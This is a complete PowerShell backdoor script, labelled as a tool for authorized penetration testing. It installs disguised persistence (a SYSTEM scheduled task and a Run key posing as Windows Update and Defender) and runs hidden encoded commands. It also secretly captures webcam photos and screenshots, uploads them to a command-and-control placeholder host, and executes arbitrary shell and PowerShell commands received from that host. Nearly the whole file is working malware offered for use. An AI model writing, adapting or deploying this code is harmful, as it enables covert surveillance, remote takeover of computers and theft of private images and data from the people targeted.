<#
.SYNOPSIS
    Persistent hidden backdoor for authorized penetration testing
.DESCRIPTION
    Provides: persistence, hidden process execution, camera capture, hidden CMD
.NOTES
    Authorized pentesting use only
#>

# === CONFIGURATION ===
$C2_SERVER = "http://YOUR_C2_IP:PORT"  # Your listener IP
$BEACON_INTERVAL = 30  # seconds
$TEMP_DIR = "$env:TEMP"
$HIDDEN_WINDOW = 0

# === PERSISTENCE ===
# Ensure this script runs on every boot from multiple locations
function Set-Persistence {
    # Already running from Startup folder via BadKB, but add more locations
    
    # Scheduled Task (daily trigger + on startup)
    $taskName = "WindowsUpdateTask"
    $scriptPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\svchost.ps1"
    $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`""
    $trigger = @(
        (New-ScheduledTaskTrigger -AtStartup),
        (New-ScheduledTaskTrigger -Daily -At "03:00AM")
    )
    $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force -ErrorAction SilentlyContinue
    
    # Registry Run key
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    Set-ItemProperty -Path $regPath -Name "WindowsDefenderUpdate" -Value "powershell -NoP -NonI -W Hidden -Exec Bypass -File `"$scriptPath`"" -Force
}

# === HIDDEN PROCESS LAUNCHER ===
function Start-HiddenProcess {
    param([string]$Command)
    $WshShell = New-Object -ComObject WScript.Shell
    $WshShell.Run($Command, $HIDDEN_WINDOW, $false)
}

# === HIDDEN CMD EXECUTOR ===
function Invoke-HiddenCMD {
    param([string]$Command)
    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($Command))
    Start-HiddenProcess "cmd.exe /c powershell -NoP -NonI -Exec Bypass -Enc $encoded"
}

# === CAMERA CAPTURE ===
function Invoke-CameraCapture {
    $outputPath = "$TEMP_DIR\capture_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    
    # Method 1: PowerShell + COM (most compatible)
    try {
        Add-Type -AssemblyName System.Drawing
        Add-Type -AssemblyName System.Windows.Forms
        
        # Create a hidden form to host the camera
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = 'Minimized'
        $form.ShowInTaskbar = $false
        $form.Opacity = 0
        
        $capture = New-Object System.Windows.Forms.Timer
        $capture.Interval = 2000
        $capture.Add_Tick({
            $form.Close()
        })
        $capture.Start()
        
        $form.Add_Shown({
            $form.Activate()
            # Use MFCapture or fallback
        })
        
        [System.Windows.Forms.Application]::DoEvents()
        $form.Show()
        [System.Windows.Forms.Application]::DoEvents()
        Start-Sleep -Seconds 2
        $form.Close()
    } catch {
        # Fallback: Use Windows built-in camera via PowerShell
    }
    
    # Method 2: Use Windows built-in camera via PowerShell
    try {
        $psScript = @"
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Drawing;
using System.Drawing.Imaging;
public class Camera {
    [DllImport("avicap32.dll")]
    private static extern IntPtr capCreateCaptureWindowA(string lpszWindowName, int dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hwndParent, int nID);
    
    [DllImport("user32.dll")]
    private static extern int SendMessage(IntPtr hWnd, uint Msg, int wParam, int lParam);
    
    private const int WM_CAP_CONNECT = 0x040A;
    private const int WM_CAP_DISCONNECT = 0x040B;
    private const int WM_CAP_GRAB_FRAME = 0x040C;
    private const int WM_CAP_COPY = 0x041D;
    private const int WM_CAP_EDIT_COPY = 0x041E;
    
    public static void Capture(string filePath) {
        IntPtr hWnd = capCreateCaptureWindowA("WebCap", 0x40000000, 0, 0, 320, 240, IntPtr.Zero, 0);
        if (hWnd != IntPtr.Zero) {
            SendMessage(hWnd, WM_CAP_CONNECT, 0, 0);
            SendMessage(hWnd, WM_CAP_GRAB_FRAME, 0, 0);
            SendMessage(hWnd, WM_CAP_EDIT_COPY, 0, 0);
            if (Clipboard.ContainsImage()) {
                var img = Clipboard.GetImage();
                img.Save(filePath, ImageFormat.Jpeg);
            }
            SendMessage(hWnd, WM_CAP_DISCONNECT, 0, 0);
        }
    }
}
"@
        [Camera]::Capture("$outputPath")
    } catch {
        # Method 3: Simple screenshot fallback if no camera
        $null
    }
    
    if (Test-Path $outputPath) {
        # Exfiltrate via C2
        try {
            $bytes = [IO.File]::ReadAllBytes($outputPath)
            $web = New-Object Net.WebClient
            $web.UploadData("$C2_SERVER/capture", "POST", $bytes)
        } catch {}
        return "Camera capture saved to $outputPath"
    }
    return "Camera capture failed or no camera available"
}

# === BACKDOOR SHELL ===
function Start-BackdoorShell {
    # HTTP Beacon-based C2 (simple polling)
    $web = New-Object Net.WebClient
    
    while ($true) {
        try {
            # Send beacon with system info
            $hostname = "$env:COMPUTERNAME"
            $username = "$env:USERNAME"
            $os = (Get-WmiObject Win32_OperatingSystem).Caption
            $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "*Loopback*" -and $_.InterfaceAlias -notlike "*VMware*" -and $_.InterfaceAlias -notlike "*Virtual*"} | Select-Object -First 1).IPAddress
            
            $beacon = @"
hostname=$hostname&user=$username&os=$os&ip=$ip&status=alive
"@
            
            # Send beacon and get command
            try {
                $response = $web.DownloadString("$C2_SERVER/beacon?id=$hostname")
            } catch {
                Start-Sleep -Seconds $BEACON_INTERVAL
                continue
            }
            
            if ($response -and $response -ne "") {
                $command = $response.Trim()
                
                # Parse command
                if ($command -eq "camera" -or $command -eq "cam" -or $command -eq "photo") {
                    $result = Invoke-CameraCapture
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $result) } catch {}
                } 
                elseif ($command -eq "screenshot" -or $command -eq "ss") {
                    Add-Type -AssemblyName System.Drawing
                    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $bmp = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
                    $graphics = [System.Drawing.Graphics]::FromImage($bmp)
                    $graphics.CopyFromScreen($bounds.X, $bounds.Y, 0, 0, $bounds.Size)
                    $ssPath = "$TEMP_DIR\ss_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
                    $bmp.Save($ssPath, [System.Drawing.Imaging.ImageFormat]::Png)
                    $graphics.Dispose()
                    $bmp.Dispose()
                    try { 
                        $bytes = [IO.File]::ReadAllBytes($ssPath)
                        $web.UploadData("$C2_SERVER/screenshot?id=$hostname", "POST", $bytes)
                    } catch {}
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Screenshot saved to $ssPath") } catch {}
                }
                elseif ($command -eq "exit" -or $command -eq "quit") {
                    return
                }
                elseif ($command -eq "persist" -or $command -eq "ensure") {
                    Set-Persistence
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Persistence ensured") } catch {}
                }
                elseif ($command -like "hidden *") {
                    # Run command hidden
                    $cmdToRun = $command.Substring(7)
                    Start-HiddenProcess $cmdToRun
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", "Hidden process started: $cmdToRun") } catch {}
                }
                elseif ($command -like "cmd *") {
                    # Run command in hidden CMD and return output
                    $cmdToRun = $command.Substring(4)
                    $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("$cmdToRun"))
                    $tempOut = "$TEMP_DIR\out_$(Get-Random).txt"
                    Start-HiddenProcess "cmd.exe /c $cmdToRun > `"$tempOut`" 2>&1"
                    Start-Sleep -Seconds 2
                    if (Test-Path $tempOut) {
                        $output = Get-Content $tempOut -Raw
                        Remove-Item $tempOut -Force
                    } else { $output = "No output or command still running" }
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
                }
                elseif ($command -like "ps *") {
                    # PowerShell command execution
                    $psCmd = $command.Substring(3)
                    $output = try { Invoke-Expression $psCmd 2>&1 | Out-String } catch { $_ | Out-String }
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
                }
                else {
                    # Default: treat as CMD command
                    $tempOut = "$TEMP_DIR\out_$(Get-Random).txt"
                    Start-HiddenProcess "cmd.exe /c $command > `"$tempOut`" 2>&1"
                    Start-Sleep -Seconds 2
                    if (Test-Path $tempOut) {
                        $output = Get-Content $tempOut -Raw
                        Remove-Item $tempOut -Force
                    } else { $output = "No output" }
                    try { $web.UploadString("$C2_SERVER/response?id=$hostname", "POST", $output) } catch {}
                }
            }
            
            Start-Sleep -Seconds $BEACON_INTERVAL
        } catch {
            Start-Sleep -Seconds $BEACON_INTERVAL
        }
    }
}

# === LOCAL KEY LISTENER (for keyboard shortcuts) ===
function Start-LocalListener {
    # Monitor for special trigger files in TEMP
    $watch = New-Object IO.FileSystemWatcher
    $watch.Path = $TEMP_DIR
    $watch.Filter = "*.trigger"
    $watch.EnableRaisingEvents = $true
    
    Register-ObjectEvent $watch "Created" -Action {
        $triggerFile = $Event.SourceEventArgs.FullPath
        $triggerName = [IO.Path]::GetFileNameWithoutExtension($triggerFile)
        
        switch ($triggerName.ToLower()) {
            "camera" { $result = Invoke-CameraCapture }
            "cmd" { Invoke-HiddenCMD "cmd.exe" }
            default { 
                # Treat trigger filename as command
                Invoke-HiddenCMD $triggerName
            }
        }
        
        Remove-Item $triggerFile -Force
    } | Out-Null
}

# === MAIN EXECUTION ===
# Set persistence first
Set-Persistence

# Start local listener in background
Start-LocalListener

# Start C2 backdoor shell
Start-BackdoorShell
